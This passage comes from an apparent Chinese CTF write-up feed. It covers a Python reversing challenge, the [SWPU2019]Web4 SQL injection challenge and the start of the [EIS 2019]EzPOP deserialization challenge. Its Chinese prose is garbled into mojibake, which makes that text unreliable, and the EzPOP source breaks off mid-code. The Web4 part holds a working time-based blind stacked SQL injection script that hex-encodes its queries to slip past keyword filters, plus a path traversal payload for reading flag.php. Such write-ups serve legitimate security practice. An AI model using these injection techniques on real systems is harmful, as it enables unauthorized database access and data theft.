class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>enCodeAgain()</code>å‡½æ•°åªæ˜¯ç®€å•çš„è·³ä¸€æ ¼å–å­—ç¬¦ã€‚</p><p>åç¼–è¯‘ä¸æ˜¯å¾ˆå®Œå…¨ï¼Œæœ‰å¾ˆå¤šé—®é¢˜ï¼Œå…¶ä¸­æœ‰ä¸ªå°æ¼æ´ï¼Œå¸ˆå‚…ä¹Ÿå‘ç°äº†ï¼Œè¿™é‡Œåªå–äº†ä¸€åŠã€‚æ‰€ä»¥éœ€è¦è¡¥ä¸€ä¸‹ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B-Easy-re/image-20210818213604413.png"></p><p>ä¼˜åŒ–åçš„ä»£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> message<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">enCodeAgain</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> space<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    a <span class="token operator">=</span> <span class="token string">''</span>    string <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> j <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>            s <span class="token operator">+=</span> string<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>                a <span class="token operator">+=</span> string<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> s<span class="token operator">+</span>acorrect <span class="token operator">=</span> <span class="token string">'VxVtd5dKIPjMw9wVb=lR2WVTcPWC2goWoeQ='</span>flag <span class="token operator">=</span> <span class="token string">''</span>flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enCodeAgain<span class="token punctuation">(</span>encode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€†å‘ä¸€ä¸‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">32</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> flag<span class="token keyword">def</span> <span class="token function">deCodeAgain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token string">'VxVtd5dKIPjMw9wVb='</span>    b <span class="token operator">=</span> <span class="token string">'lR2WVTcPWC2goWoeQ='</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> s<span class="token keyword">print</span><span class="token punctuation">(</span>decode<span class="token punctuation">(</span>deCodeAgain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡º<strong>flag{fEncE_1s_s0_fUn}</strong></p><p>æ‹¿å›åŸä»£ç æ‰§è¡Œä¸‹ï¼Œè¾“å‡º<strong>VxVtd5dKIPjMw9wVb=lR2WVTcPWC2goWoeQ</strong>ï¼Œå°‘äº†ä¸ªè¡¥ä½çš„=ï¼Œä¹Ÿæ²¡å·®</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> Pythonåç¼–è¯‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[SWPU2019]Web4</title>
      <link href="/p/2798247945.html"/>
      <url>/p/2798247945.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[PDO|PDOSQLæ³¨å…¥]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818131748854.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>/static/js/login.js</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818131912162.png"></p><p>æ€ªï¼Œéšæ‰‹ä¸€è¯•å°±ç™»å½•æˆåŠŸäº†</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818141958030.png"></p><p>å•å¼•å·ï¼ŒæŠ¥è¯­æ³•é”™è¯¯ï¼Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818161946674.png"></p><p>å†åŠ ä¸Šåˆ†å·åˆæ­£å¸¸ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•å †å æ³¨å…¥.</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818162006205.png"></p><h3 id="PDOæ³¨å…¥"><a href="#PDOæ³¨å…¥" class="headerlink" title="PDOæ³¨å…¥"></a>PDOæ³¨å…¥</h3><p>ç±»ä¼¼ORMæ¡†æ¶å§ã€‚</p><blockquote><p>PHPæ•°æ®å¯¹è±¡ï¼ˆPDOï¼‰æ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£<br>PHPè¿æ¥MySQLæ•°æ®åº“çš„æ–¹å¼ï¼šMySQLã€Mysqliã€PDO</p></blockquote><p><a href="https://xz.aliyun.com/t/3950">PDOåœºæ™¯ä¸‹çš„SQLæ³¨å…¥æ¢ç©¶</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/QQ%E5%9B%BE%E7%89%8720210818160939.png"></p><blockquote><p>Mysqlié€šè¿‡multi_query()å‡½æ•°æ¥è¿›è¡Œå¤šè¯­å¥æ‰§è¡Œï¼Œæ™®é€šçš„mysqli_query()å‡½æ•°åªæ‰§è¡Œå•ä¸ªè¯­å¥</p><p>PDOé»˜è®¤æ”¯æŒå¤šè¯­å¥æŸ¥è¯¢ï¼Œå¦‚æœphpç‰ˆæœ¬å°äº5.5.21æˆ–è€…åˆ›å»ºPDOå®ä¾‹æ—¶æœªè®¾ç½®<code>PDO::MYSQL_ATTR_MULTI_STATEMENTS</code>ä¸º<code>false</code>æ—¶å¯èƒ½ä¼šé€ æˆ<strong>å †å æ³¨å…¥</strong>ï¼Œè®¾ç½®<code>$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</code>æƒ…å†µä¸‹å¯ä»¥<strong>æŠ¥é”™æ³¨å…¥</strong></p></blockquote><p>ç”±äºè¿‡æ»¤äº†select,if,sleep,substrç­‰å¤§å¤šæ•°æ³¨å…¥å¸¸è§çš„å•è¯ï¼Œä½†æ˜¯æ³¨å…¥åˆä¸å¾—ä¸ä½¿ç”¨å…¶ä¸­çš„æŸäº›å•è¯ã€‚é‚£ä¹ˆåœ¨è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨16è¿›åˆ¶+mysqlé¢„å¤„ç†æ¥ç»•è¿‡ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">'select 123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//73656C65637420313233</span><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656C65637420313233</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> test <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818143036402.png"></p><p>é‚£æ€è·¯å°±å¾ˆæ˜æ˜¾äº†,åˆ©ç”¨å †å æ³¨å…¥+ç›²æ³¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">'select sleep(10)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656C65637420736C65657028313029</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> test <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸€èˆ¬åˆ°<code>;</code>å°±ç»“æŸäº†ï¼Œåé¢ä¹Ÿä¸éœ€è¦ç”¨æ³¨é‡Šç¬¦ï¼Œè€Œä¸”å¦‚æœç”¨äº†å¤šè¡Œæ³¨é‡Š<code>#</code>å¯èƒ½ä¼šå¯¼è‡´åé¢çš„è¯­æ³•æ‰§è¡Œé”™è¯¯ã€‚</p><p>è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://a399ab47-58e4-4820-a59f-6c7a7efd6bb7.node4.buuoj.cn:81/index.php?r=Login/Login'''</span>    payloads <span class="token operator">=</span> <span class="token string">"asd';set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest;"</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># æŸ¥è¯¢payload</span>        payload <span class="token operator">=</span> <span class="token string">"select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)"</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç </span>            datas <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> payloads<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str_to_hex<span class="token punctuation">(</span>                payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'test213'</span><span class="token punctuation">&#125;</span>            data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>datas<span class="token punctuation">)</span>            times <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>Timeout<span class="token punctuation">:</span>                flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤šè¯•å‡ æ¬¡ï¼Œè·‘å‡ºæ¥æ˜¯<code>glzjin_wants_a_girl_friend.zip</code></p><p>ä¸‹è½½ä¸‹æ¥ï¼ŒMVCæ¡†æ¶.</p><h3 id="urlå¤§è‡´çš„è§£ææµç¨‹"><a href="#urlå¤§è‡´çš„è§£ææµç¨‹" class="headerlink" title="urlå¤§è‡´çš„è§£ææµç¨‹"></a>urlå¤§è‡´çš„è§£ææµç¨‹</h3><p>ä»rå‚æ•°ä¸­è·å–è¦è®¿é—®çš„Controllerä»¥åŠAction,ç„¶åä»¥/åˆ†éš”å¼€åæ‹¼æ¥æˆå®Œæ•´çš„æ§åˆ¶å™¨åã€‚ä»¥Login/Indexä¸ºä¾‹ï¼Œå°±æ˜¯å°†Login/Indexåˆ†éš”å¼€åˆ†åˆ«æ‹¼æ¥æˆLoginControllerä»¥åŠactionIndex,ç„¶åè°ƒç”¨LoginControllerè¿™ä¸ªç±»ä¸­çš„actionIndexæ–¹æ³•ã€‚æ¯ä¸ªactioné‡Œé¢ä¼šè°ƒç”¨å¯¹åº”çš„loadView()æ–¹æ³•è¿›è¡Œæ¨¡ç‰ˆæ¸²æŸ“ï¼Œç„¶åå°†é¡µé¢è¿”å›ç»™å®¢æˆ·ç«¯ã€‚è‹¥è®¿é—®çš„Controllerä¸å­˜åœ¨åˆ™é»˜è®¤è§£æLogin/Indexã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818165518569.png"></p><p>åœ¨BaseController.phpä¸­ï¼Œæ˜æ˜¾è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>extract()</code>è¿›è¡Œå˜é‡è¦†ç›–ï¼Œäºæ˜¯æ¥ä¸‹æ¥å°±è¦æ‰¾<code>$viewData</code>åœ¨å“ªå¯ä»¥æ§åˆ¶ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818170822451.png"></p><p>æ˜æ˜¾ï¼Œåœ¨UserController.phpä¸­ï¼Œ<code>$viewData</code>æ˜¯å¯æ§çš„ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818171350231.png"></p><p>æ‰€ä»¥æŒ‰ç…§urlè§£ææµç¨‹ï¼Œ</p><pre class="line-numbers language-none"><code class="language-none">index.php?r&#x3D;User&#x2F;Index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯ç›´æ¥åŒ…å«flag.phpï¼Œè¿˜æ˜¯è¯»å–ä¸äº†é‡Œé¢å†…å®¹ï¼Œæ‰€ä»¥å¾—æ‰¾å…¶ä»–åŠæ³•</p><p>åœ¨è¿™ï¼Œæ­£å¥½æœ‰è½¬åŒ–base64è¾“å‡ºçš„ä»£ç å¯ä»¥åˆ©ç”¨ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818185340434.png"></p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">img_file&#x3D;&#x2F;..&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818191056981.png"></p><p>è§£ç ä¸€ä¸‹ï¼Œç»“æŸ</p><pre class="line-numbers language-none"><code class="language-none">PD9waHAKICAgIGVjaG8gImZsYWcgaXMgaGVyZSxidXQgeW91IG11c3QgdHJ5IHRvIHNlZSBpdC4iOwogICAgJGZsYWcgPSAiZmxhZ3s4MzM0OTMxNS1mNDE3LTRkYTMtOTQ0OS0zM2ZhZjZhNzdmN2V9IjsK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818191123627.png"></p><p>åœ¨è¿™å‘ç°ä¸ªå¥‡æ€ªçš„äº‹</p><p>chromeé‡Œçš„hackbarä¼¼ä¹å¯¹å¸¦æœ‰æ¢è¡Œçš„base64è§£ç å¤„ç†ä¸å¤ªå¥½</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818191201454.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818191210846.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[EIS 2019]EzPOP</title>
      <link href="/p/286731300.html"/>
      <url>/p/286731300.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ååºåˆ—åŒ–]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flysystem'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">cleanContents</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$contents</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cachedProperties</span> <span class="token operator">=</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token string single-quoted-string">'path'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'basename'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'size'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mimetype'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'visibility'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'timestamp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'type'</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$contents</span> <span class="token keyword">as</span> <span class="token variable">$path</span> <span class="token operator">=></span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$cachedProperties</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getCacheKey</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span 